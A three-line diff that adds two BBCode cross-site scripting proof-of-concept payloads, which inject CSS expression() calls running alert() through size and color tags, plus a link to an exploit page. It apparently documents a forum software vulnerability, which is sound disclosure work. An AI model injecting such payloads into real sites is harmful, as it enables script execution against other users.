@@ -1,0 +1,3 @@
+XSS example 1: [size=expression(alert(123))]size[/size]
+XSS example 2: [color=expression(alert(456))]blue[/color]
+http://www.example.com/vulns/161/exploit.html
